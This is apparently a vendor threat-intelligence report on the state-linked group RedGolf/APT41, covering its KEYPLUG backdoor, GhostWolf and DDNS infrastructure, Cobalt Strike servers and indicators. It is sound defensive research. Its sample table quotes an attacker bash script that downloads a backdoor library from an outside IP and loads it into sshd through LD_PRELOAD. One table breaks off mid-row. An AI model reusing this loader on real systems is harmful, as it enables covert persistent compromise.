We attribute this activity to\na threat activity group tracked as RedGolf, which is highly likely to be a Chinese state-sponsored group.\nRedGolf closely overlaps with threat activity reported in open sources under the aliases APT41/BARIUM\nand has likely carried out state-sponsored espionage activity in parallel with financially motivated\noperations for personal gain from at least 2014 onward. A 2020 US Department of Justice (DOJ)\n[indictment states that a RedGolf-associated threat actor boasted](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) of connections to the Chinese\n[Ministry of State Security (MSS); the indicted actors were also linked](https://intrusiontruth.wordpress.com/2022/07/23/the-people-behind-chengdu-404/) to the Chengdu-based company\nChengdu 404 Network Technology (成都市肆零肆网络科技有限公司).\n\nThe group remains highly active within a wide range of geographies and industry verticals, targeting\naviation, automotive, education, government, media, information technology, and religious organizations\n[(1, 2, 3). Organizations operating in these industries — particularly those whose products or activities](https://www.mandiant.com/resources/blog/mobileiron-log4shell-exploitation)\nmay be of strategic interest to the Chinese government and security services — are at increased risk of\ntargeting. RedGolf has historically exploited public and zero-day vulnerabilities in internet-facing\ndevices for initial access, including Citrix, Cisco, and Zoho. Maintaining a frequent patching cadence for\nthese devices is essential for addressing known security issues.\n\nRedGolf [used](https://www.mandiant.com/resources/blog/apt41-us-state-governments) a Linux version of the custom, modular backdoor KEYPLUG to target US state\ngovernment entities during 2021 and 2022. Insikt Group has identified a wider cluster of KEYPLUG\nsamples and infrastructure used by RedGolf from at least 2021 to 2023. We track this malicious\ninfrastructure using the term GhostWolf. Alongside KEYPLUG, we also identified RedGolf using Cobalt\nStrike, PlugX, and Dynamic DNS (DDNS) domains, all of which are commonly used by many Chinese\nstate-sponsored threat groups. Insikt Group identified multiple infrastructure overlaps between publicly\nreported APT41/BARIUM campaigns across the GhostWolf infrastructure cluster.\n\n| f\n\n\n-----\n\n**Figure 1: RedGolf infrastructure and tactics, techniques, and procedures (TTPs) overlaps with APT41 and BARIUM (Source:**\nRecorded Future)\n\n| f\n\n\n-----\n\n## Threat/Technical Analysis\n\n#### KEYPLUG Malware\n\nKEYPLUG is a custom, modular backdoor deployed by RedGolf that has Windows and Linux versions.\n[RedGolf heavily used KEYPLUG between May 2021 and February 2022 in a campaign that compromised](https://www.mandiant.com/resources/blog/apt41-us-state-governments)\nat least 6 US state governments. KEYPLUG C2 traffic supports at least 5 network protocols, including\nHTTP, TCP, KCP over UDP, and WSS.\n\n[From the KEYPLUG samples published](https://www.mandiant.com/resources/blog/apt41-us-state-governments) by Mandiant and by hunting for samples communicating with\nGhostWolf infrastructure, we identified 9 more KEYPLUG samples that are highly likely used by RedGolf.\n\n**Malware** **SHA256** **Filename** **Network Indicators** **Comments**\n**Variant**\n\nKEYPLUG.LINUX `e024ccc4c72eb` kernel linux.down-flash[.]com Hosted on:\n`5813cc2b6db79` http://103.226.155[.]96:80\n`75e4750337a1c` 103.226.155[.]96:1443 00/kernel\n```\n          c619d7339b21f\n\n```\n`dbb32d93fd85` Hash originally listed on\n\n[the Mandiant APT41 blog](https://www.mandiant.com/resources/blog/apt41-us-state-governments)\n\nBash Script `39c8a31dee110` update.sh Downloads KEYPLUG Bash script content:\n`93810c7b142b4` ‘update.so’ from\n`fe8770e8c8d1b` 103.226.155[.]96 `cd /lib/security`\n```\n          3c09749a2888e wget\n          cc32d24f4d09 http://103.226.155[.]96/u\n                                         pdate.so\n                                         LD_PRELOAD=/lib/security/\n                                         update.so /usr/sbin/sshd\n\n```\nKEYPLUG.LINUX `006e096f82e9f` update.so WSS[:]//chrome.down-flash[.] The configuration for this\n`2bb3bb3f4fd48` com:443 sample specifies the use\n`85a81b426b425` of WSS (WebSocket)\n`b2b7a7bfd90b4` protocol.\n`b65d44ab5e7e` 103.226.155[.]96\n\nKEYPLUG.LINUX `9a94070f547f8` update chrome.down-flash[.]com\n```\n          e517bcf4dabfd\n\n```\n`36a7f2b83bb9e` 103.226.155[.]96\n```\n          0eae6e4685cc2\n          33b07b0a2897\n\n```\n| f\n\n|Malware Variant|SHA256|Filename|Network Indicators|Comments|\n|---|---|---|---|---|\n|KEYPLUG.LINUX|e024ccc4c72eb 5813cc2b6db79 75e4750337a1c c619d7339b21f dbb32d93fd85|kernel|linux.down-flash[.]com 103.226.155[.]96:1443|Hosted on: http://103.226.155[.]96:80 00/kernel Hash originally listed on the Mandiant APT41 blog|\n|Bash Script|39c8a31dee110 93810c7b142b4 fe8770e8c8d1b 3c09749a2888e cc32d24f4d09|update.sh|Downloads KEYPLUG ‘update.so’ from 103.226.155[.]96|Bash script content: cd /lib/security wget http://103.226.155[.]96/u pdate.so LD_PRELOAD=/lib/security/ update.so /usr/sbin/sshd|\n|KEYPLUG.LINUX|006e096f82e9f 2bb3bb3f4fd48 85a81b426b425 b2b7a7bfd90b4 b65d44ab5e7e|update.so|WSS[:]//chrome.down-flash[.] com:443 103.226.155[.]96|The configuration for this sample specifies the use of WSS (WebSocket) protocol.|\n|KEYPLUG.LINUX|9a94070f547f8 e517bcf4dabfd 36a7f2b83bb9e 0eae6e4685cc2 33b07b0a2897|update|chrome.down-flash[.]com 103.226.155[.]96||\n\n\n-----\n\n|KEYPLUG|2345c426c584e c12f7a2106a52 ce8ac4aeb1444 76d1a4e4b78c1 0addfddef920|alibaba.exe|WSS[:]//chrome.down-flash[.] com:443|Hosted on http://103.226.155[.]96/ali baba.exe Packaged with VMProtect (3.2.0-3.5.0) Microsoft Linker (14.0)|\n|---|---|---|---|---|\n|KEYPLUG.LINUX|f4474dcbfaf85 70fa4bcdd4151 d53516664ef5c b7f21f3b4520f 791626fdc441|dns_x64.old|TCP[:]//linux.down-flash[.]com :1443||\n|KEYPLUG.LINUX|a1398dd8cec06 c07a33b94e9d5 9d38313efcce9 27cc27425ade4 8dba48c3345f|nac|TCP[:]//193.200.149[.]195:80||\n|KEYPLUG.LINUX|a6ead353dd733 8b7ae51825528 9993f7cca70bd eceaf31004ec0 b8a1036378d3|logo.png|TCP[:]//202.79.173[.]228:8081||\n|KEYPLUG|5921d1686f9f4 b6d26ac353cfc e3e85e5790631 1a80806903c9b 40f85429b225|svchost.exe|TCP[:]//43.229.155[.]38:8443 HTTPS[:]//cdn.google-au[.]ga: 8443|Packaged with VMProtect (3.2.0-3.5.0) Microsoft Linker (10.0)|\n|KEYPLUG|83ef976a3c3ca 9fcd438eabc9b 935ca5d46a3fb 00e2276ce4061 908339de43ec|host_UDP_53 _win_x64.dll|UDP[:]//fonts.google-au[.]ga:53|DLL packaged with VMProtect (3.2.0-3.5.0) Microsoft Linker (10.0)|\n|KEYPLUG|4ffc7f65e16ce 59ff9e6a504f8 8e0cf56b225c0 eb2cf8ec578b3 e9d40d9bd898|Decrypted from config.dat|HTTPS[:]//static.tcplog[.]com: 443|Sample and domain referenced in UK NCSC Goofy Guineapig report|\n\n\n**Table 1: KEYPLUG samples, associated files, and network infrastructure (Source: Recorded Future)**\n\nWe identified 3 KEYPLUG samples that employed VMProtect, which RedGolf has [commonly used to](https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Winnti.pdf)\n[package malware to hinder detection and analysis. The version of VMProtect we detected likely was](https://www.mandiant.com/resources/blog/apt41-us-state-governments)\nthe same as in previous detections, but the version of Microsoft Linker ranged between 10.0 and 14.0.\nThe sample, “alibaba.exe”, is likely a later version of KEYPLUG given that it was packaged with a newer\nversion of Microsoft Linker and had the WSS C2 capability described by [Mandiant.](https://www.mandiant.com/resources/blog/apt41-us-state-governments)\n\n| f\n\n\n-----\n\n**Figure 2: Comparison of VMProtect-packaged versions of KEYPLUG (Source: Recorded Future)**\n\n\n-----\n\n#### GhostWolf Infrastructure\n\nWe identified a commonality across multiple servers found within RedGolf’s infrastructure. We track this\nunique infrastructure TTP as GhostWolf; this configuration has been in use since at least December\n2020 and is still in use.\n\nThis GhostWolf configuration is very likely linked to KEYPLUG C2 infrastructure given frequent overlaps\nwith publicly identified KEYPLUG samples and the additional samples identified in Table 1 above. Some\nGhostWolf infrastructure has also been linked to other RedGolf-associated malware, including PlugX.\n**Figure 3 below shows the number of unique GhostWolf IP addresses observed over the past 2 years.**\nThere is a distinct reduction in the number of servers detected towards the end of 2022, a trend that is\nalso reflected in the previous year’s data.\n\n**Figure 3: RedGolf GhostWolf infrastructure detections, December 2020 to February 2023 (Source: Recorded Future)**\n\nThroughout January 2022 to February 2023, we observed 11 hosting providers used for 42 GhostWolf\nIP addresses; there was no discernible trend in the choice of providers used, but the majority of\ninfrastructure was located in Asia, with the remainder in the United States, as depicted in Figure 5. The\nspread of providers is likely a conscious decision by the threat actors to diversify their malicious\ninfrastructure.\n\n| f\n\n\n-----\n\nOn 4 occasions, we identified consecutively or closely assigned IP addresses used for GhostWolf\ninfrastructure (for example, 23.225.199[.]162, 23.225.199[.]164, 23.225.199[.]165). We have previously\nobserved block assignment of IP addresses to a threat actor when the associated infrastructure is\npurchased from a hosting reseller. Buying infrastructure from a reseller rather than directly from the\nprovider reduces the risk of the infrastructure being traced back to an individual. Figure 5 below shows\nthe overlap in hosting providers and their use throughout January 2022 to February 2023.\n\n**Figure 4: Geographical spread of 42 GhostWolf IP addresses between January 2022 andFebruary 2023 (Source: Recorded**\n[Future; image created using Plotly/Plotly.py under the MIT License)](https://github.com/plotly/plotly.py/blob/master/LICENSE.txt)\n\n**Figure 5: Hosting providers used for 42 GhostWolf IP addresses between January 2022 and February 2023 (Source: Recorded**\n[Future; image created using Plotly/Plotly.py under the MIT License)](https://github.com/plotly/plotly.py/blob/master/LICENSE.txt)\n\n| f\n\n\n-----\n\nA full list of GhostWolf infrastructure can be found in Appendix A.\n\n#### DDNS Tradecraft\n\nThrough persistent monitoring of previously reported infrastructure that has been publicly attributed to\n[APT41 and BARIUM (1, 2), we identified a cluster of Dynamic DNS (DDNS) domains and infrastructure](https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/hunting-for-barium-using-azure-sentinel/ba-p/1875913)\nhighly likely used across multiple campaigns by RedGolf. Over the past 2 years, this cluster has included\ncommand and control (C2) servers for Cobalt Strike and PlugX malware and has links to infrastructure\nused for KEYPLUG malware.\n\nWe track DNS resolution changes for domains in this cluster, 2 of which (ltupdate[.]ddns[.]net and\ncloudat[.]ddns[.]net ) have been active in January 2023. These domains resolved to a Cobalt Strike C2\nIP address, 193.239.154[.]221, which Recorded Future first identified on May 2, 2022. Further\ninformation about RedGolf's Cobalt Strike activity is included in the following section of this report.\n\n**Figure 6: Intelligence Card for Cobalt Strike C2 IP address 192.239.154[.]221 (Source: Recorded Future)**\n\n| f\n\n\n-----\n\nRedGolf threat actors have been frequently observed updating their DDNS domains to resolve to\noperational infrastructure for short periods of time, typically less than 24 hours, before parking the\ndomains on loopback IP address 127.0.0[.]1 while not in use. This is a common tactic employed by threat\nactors to subvert security teams and reduce the exposure of their infrastructure.\n\nAlongside its DDNS use, we have also observed RedGolf using both traditionally registered domains and\nfree-to-register domains from TLDs such as .tk, .cf and .ml. Over the past 4 months, however, RedGolf’s\nuse of DDNS domains has decreased, with resolution changes and new domains becoming less\nfrequent. Further, in March 2023, Freenom, a provider of free-to-register domains including .tk, .cf, and\n[.ml, halted](https://krebsonsecurity.com/2023/03/sued-by-meta-freenom-halts-domain-registrations/) the registration of new free domains after a lawsuit filed by social media giant Meta. A full list\nof indicators has been provided in Appendix A.\n\n## Cobalt Strike\n\nInsikt Group identified 2 active Cobalt Strike C2 servers likely used by RedGolf, which both implemented\na jQuery Malleable profile. Historically, the majority of RedGolf-associated Cobalt Strike C2s found in\nthis cluster of infrastructure have also used a jQuery Malleable profile and in some cases were also\ndetected using [cs2modrewrite. Threat actors use malleable profiles with Cobalt Strike to change the](https://github.com/threatexpress/cs2modrewrite)\nappearance of its network traffic in order to evade detection. Modifying the way the traffic looks can\nmake it appear less suspicious and blend in with normal network traffic, making it harder for defenders\nto identify and detect the malicious activity.\n\nThe most recently active RedGolf Cobalt Strike infrastructure has been active for substantially longer\nthan other RedGolf Cobalt Strike C2s we detected.\n\n| f\n\n\n-----\n\n|C2 IP Address|Active Time Frame|Comments|\n|---|---|---|\n|193.239.154[.]221|May 3, 2022 to February 8, 2023|jQuery Malleable Profile|\n|27.124.37[.]62|September 7, 2022 to February 14, 2023|jQuery Malleable Profile cs2modrewrite These 3 IP addresses all likely resolve to the same Cobalt Strike C2 server.

We observed infrastructure overlaps between the domains (portomnail[.]com\nand openmd5[.]com ) reported by MSTIC and PlugX C2 infrastructure, IP address 137.220.178[.]43 . We\nobserved this C2 targeting mail servers in early to mid-2021, with this activity [likely](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/) tied to the\nexploitation of 4 Microsoft Exchange Server vulnerabilities (CVE-2021-26855, CVE-2021-26857,\nCVE-2021-26858, CVE-2021-27065) released in March 2021. These domains also have hosting overlaps\nwith IP addresses observed within the identified DDNS cluster.\n\n| f\n\n\n-----\n\n## Mitigations\n\nA previous [Insikt Group report provides a comprehensive breakdown of detection and mitigation](https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf)\ntechniques related to Cobalt Strike.\n\nRecorded Future proactively detects both Cobalt Strike and PlugX servers and are logged in the\nCommand and Control Security Control Feed. Recorded Future clients can incorporate this feed into\nblocking lists and alerting to help prevent infections.\n\n## Outlook\n\nRedGolf will likely continue to target victims with KEYPLUG malware and its derivatives using command\nand control infrastructure spanning a variety of hosting providers and likely purchased through a\nhosting reseller. The group has previously used a mixture of traditionally registered domains and DDNS\ndomains, often featuring a technology theme. This TTP is likely to remain relatively unchanged, with the\nexception of a decrease in DDNS use.\n\nThe use of Cobalt Strike and PlugX to target victim machines by Chinese state-sponsored threat\nactivity groups such as RedGolf is highly likely to [continue](https://www.recordedfuture.com/2022-adversary-infrastructure-report) given the feature set provided by these tools,\ntheir ready availability, and the ability to obfuscate responsibility due to the number of other threat\nactors using these techniques.\n\n| f\n\n\n-----\n\n## Appendix A (Indicators Of Compromise)\n\n\n| f\n\n\n-----\n\n| f\n\n\n-----\n\n| f\n\n\n-----\n\n| f\n\n\n-----\n\nAbout Insikt Group[®]\n\nInsikt Group is Recorded Future’s threat research division, comprising analysts and\nsecurity researchers with deep government, law enforcement, military, and intelligence\nagency experience.
